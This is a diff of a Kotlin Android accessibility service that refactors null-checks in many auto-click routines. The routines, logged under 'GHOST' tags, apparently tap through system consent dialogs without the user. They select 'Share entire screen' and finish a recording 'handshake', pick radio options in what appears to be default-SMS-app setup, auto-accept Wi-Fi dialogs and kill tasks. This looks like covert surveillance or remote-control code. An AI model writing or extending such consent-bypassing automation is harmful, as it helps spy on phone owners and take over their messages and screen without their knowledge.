@@ -557,22 +557,28 @@ class MyAccessibilityService : AccessibilityService() {
                 DebugLogger.log("GHOST_REC", "Lifecycle: Detected A14 Selection Dropdown.")
                 for (node in shareEntireNodes) {
                     var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target != null && !target.isClickable) target = target.parent
-                    if (target != null &amp;&amp; target.isClickable) {
+                    while (target != null && !target.isClickable) {
+                        target = target.parent
+                    }
+                    val safeTarget = target
+                    if (safeTarget != null && safeTarget.isClickable) {
                         DebugLogger.log("GHOST_REC", "Action: Tapping 'Share entire screen'...")
-                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                         return // Exit event handler to let the UI refresh for the next step
                     }
                 }
             }
             
-            if (shareOneNodes.isNotEmpty() &amp;&amp; shareEntireNodes.isEmpty()) {
+            if (shareOneNodes.isNotEmpty() && shareEntireNodes.isEmpty()) {
                 DebugLogger.log("GHOST_REC", "Lifecycle: Dropdown collapsed. 'Share one app' currently active. Re-opening...")
                 for (node in shareOneNodes) {
                     var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target != null &amp;&amp; !target.isClickable) target = target.parent
-                    if (target != null &amp;&amp; target.isClickable) {
-                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                    while (target != null && !target.isClickable) {
+                        target = target.parent
+                    }
+                    val safeTarget = target
+                    if (safeTarget != null && safeTarget.isClickable) {
+                        safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                         return 
                     }
                 }
@@ -592,14 +598,15 @@ class MyAccessibilityService : AccessibilityService() {
 
                         var target: android.view.accessibility.AccessibilityNodeInfo? = node
                         var climbLevel = 0
-                        while (target != null &amp;&amp; !target.isClickable &amp;&amp; climbLevel &lt; 3) {
+                        while (target != null && !target.isClickable && climbLevel < 3) {
                             target = target.parent
                             climbLevel++
                         }
                         
-                        if (target != null &amp;&amp; target.isClickable) {
+                        val safeTarget = target
+                        if (safeTarget != null && safeTarget.isClickable) {
                             DebugLogger.log("GHOST_REC", "Action: Final Handshake! Clickiing via keyword '$keyword' (Climb: $climbLevel)")
-                            val success = target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            val success = safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                             
                             if (success) {
                                 ScreenRecordManager.expectedMode = "" // Disarm sequence
@@ -1139,15 +1146,14 @@ class MyAccessibilityService : AccessibilityService() {
                     
                     for (node in appNodes) {
                         var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                        while (target?.isClickable == false) {
-                            target = target?.parent
+                        while (target != null && !target.isClickable) {
+                            target = target.parent
                         }
-                        target?.let { safeTarget ->
-                            if (safeTarget.isClickable) {
-                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                clickedRadio = true
-                                DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
-                            }
+                        val safeTarget = target
+                        if (safeTarget != null && safeTarget.isClickable) {
+                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            clickedRadio = true
+                            DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
                         }
                         if (clickedRadio) break
                     }
@@ -1262,8 +1268,9 @@ class MyAccessibilityService : AccessibilityService() {
                         var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[i]
                         while (target != null && !target.isClickable) target = target.parent
                         
-                        if (target != null && target.isClickable) {
-                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        val safeTarget = target
+                        if (safeTarget != null && safeTarget.isClickable) {
+                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                             DebugLogger.log("SMS_NAV", "Clicked clickable candidate $i for '$targetLabel'")
                             clicked = true
                             prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
@@ -1355,8 +1362,9 @@ class MyAccessibilityService : AccessibilityService() {
                         for (node in smsNodes) {
                             var target: android.view.accessibility.AccessibilityNodeInfo? = node
                             while (target != null && !target.isClickable) target = target.parent
-                            if (target != null) {
-                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            val safeTarget = target
+                            if (safeTarget != null && safeTarget.isClickable) {
+                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                 prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
                                 DebugLogger.log("SMS_NAV", "Clicked SMS category: $kw")
                                 categoryClicked = true
@@ -1440,8 +1448,9 @@ class MyAccessibilityService : AccessibilityService() {
                         var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[i]
                         while (target != null && !target.isClickable) target = target.parent
                         
-                        if (target != null && target.isClickable) {
-                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        val safeTarget = target
+                        if (safeTarget != null && safeTarget.isClickable) {
+                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                             DebugLogger.log("LAUNCHER_NAV", "Clicked clickable candidate $i for '$targetLabel'")
                             clicked = true
                             prefs.edit().putLong("launcher_nav_loop_ts", System.currentTimeMillis()).apply()
@@ -1506,8 +1515,9 @@ class MyAccessibilityService : AccessibilityService() {
                         for (node in nodes) {
                             var target: android.view.accessibility.AccessibilityNodeInfo? = node
                             while (target != null && !target.isClickable) target = target.parent
-                            if (target != null) {
-                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            val safeTarget = target
+                            if (safeTarget != null && safeTarget.isClickable) {
+                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                 prefs.edit().putLong("launcher_nav_cat_ts", System.currentTimeMillis()).apply()
                                 DebugLogger.log("LAUNCHER_NAV", "Clicked Category: $kw")
                                 categoryClicked = true
@@ -1548,8 +1558,9 @@ class MyAccessibilityService : AccessibilityService() {
                     for (node in nodes) {
                         var target: android.view.accessibility.AccessibilityNodeInfo? = node
                         while (target != null && !target.isClickable) target = target.parent
-                        if (target != null && target.isClickable) {
-                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        val safeTarget = target
+                        if (safeTarget != null && safeTarget.isClickable) {
+                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                             DebugLogger.log("GHOST_WIFI", "Auto-clicked connection dialog: $kw")
                             isWaitingForWifiDialog = false
                             clicked = true
@@ -2464,9 +2475,10 @@ class MyAccessibilityService : AccessibilityService() {
             target = target.parent
             depth++
         }
-        if (target != null && target.isClickable) {
-            val success = target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-            DebugLogger.log(tag, "Clicked node (Class: ${target.className}, Text: ${target.text ?: target.contentDescription}, Depth climbed: $depth) -> Success: $success")
+        val safeTarget = target
+        if (safeTarget != null && safeTarget.isClickable) {
+            val success = safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+            DebugLogger.log(tag, "Clicked node (Class: ${safeTarget.className}, Text: ${safeTarget.text ?: safeTarget.contentDescription}, Depth climbed: $depth) -> Success: $success")
             return success
         }
         DebugLogger.log(tag, "Failed to click: Node and parents are unclickable. Initial text: $initialText, Class: $initialClass")
@@ -2518,13 +2530,13 @@ class MyAccessibilityService : AccessibilityService() {
                         if (!nodes.isNullOrEmpty()) {
                             for (node in nodes) {
                                 // Fallback: sometimes text nodes aren't clickable, but their parents are
-                                var target: AccessibilityNodeInfo? = node
+                                var target: android.view.accessibility.AccessibilityNodeInfo? = node
                                 while (target != null && !target.isClickable) {
                                     target = target.parent
                                 }
-                                val finalTarget = target
-                                if (finalTarget != null && finalTarget.isClickable) {
-                                    finalTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                val safeTarget = target
+                                if (safeTarget != null && safeTarget.isClickable) {
+                                    safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                     clicked = true
                                     DebugLogger.log("ANR_KILL", "Task purge executed via '$kw'.")
                                     break
